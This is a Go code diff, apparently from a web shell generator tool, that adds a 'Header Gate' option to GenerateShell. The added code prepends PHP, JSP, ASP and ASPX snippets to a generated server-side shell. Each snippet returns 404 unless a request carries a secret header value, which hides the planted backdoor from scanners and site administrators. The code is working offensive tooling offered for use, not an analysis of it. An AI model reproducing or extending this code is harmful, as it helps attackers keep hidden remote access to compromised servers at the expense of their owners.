@@ -285,6 +285,52 @@ func FileExt(scriptType string) string {
 	return "txt"
 }
 
+// GateOpts 生成选项：Header Gate（服务端只在校验头匹配时才执行，默认 404）。
+type GateOpts struct {
+	Header string // 触发头名（如 X-Gate）
+	Value  string // 触发头值
+}
+
+// gatePrefix 各语言的 Header Gate 前置片段（php/jsp/jspx/asp/aspx 支持；
+// py/node 由外层框架管 header，忽略 gate）。
+func gatePrefix(scriptType string, g GateOpts) string {
+	if g.Header == "" || g.Value == "" {
+		return ""
+	}
+	h := strings.ToUpper(g.Header)
+	if strings.HasPrefix(h, "HTTP-") {
+		h = strings.TrimPrefix(strings.ToUpper(strings.ReplaceAll(g.Header, "-", "_")), "HTTP_")
+	} else {
+		h = strings.ToUpper(strings.ReplaceAll(g.Header, "-", "_"))
+	}
+	switch scriptType {
+	case "php":
+		return "<?php\nif (!isset($_SERVER['HTTP_" + h + "']) || $_SERVER['HTTP_" + h + "'] !== '" + g.Value + "') { http_response_code(404); exit; }\n?>\n"
+	case "jsp", "jspx":
+		return "<%\n    String gate = request.getHeader(\"" + g.Header + "\");\n    if (gate == null || !gate.equals(\"" + g.Value + "\")) { response.sendError(404); return; }\n%>\n"
+	case "asp":
+		return "<%\nIf Request.ServerVariables(\"HTTP_" + h + "\") <> \"" + g.Value + "\" Then Response.End\n%>\n"
+	case "aspx":
+		return "<%\nif (Request.Headers[\"" + g.Header + "\"] != \"" + g.Value + "\") { Response.StatusCode = 404; Response.End; }\n%>\n"
+	}
+	return ""
+}
+
+// GenerateShellOpts 生成 + Header Gate。
+func GenerateShellOpts(scriptType, encoder, password string, gate GateOpts) (string, error) {
+	code, err := GenerateShell(scriptType, encoder, password)
+	if err != nil {
+		return "", err
+	}
+	gp := gatePrefix(scriptType, gate)
+	if gp == "" {
+		return code, nil
+	}
+	// php 的模板本身以 <?php 开头：gate 片段已是独立 php 块，直接前置
+	// jsp/asp/aspx 的 gate 是独立 scriptlet，前置即可
+	return gp + code, nil
+}
+
 // GenerateShell 生成服务端 shell 文件内容。不支持组合返回 error。
 func GenerateShell(scriptType, encoder, password string) (string, error) {
 	var tpl string
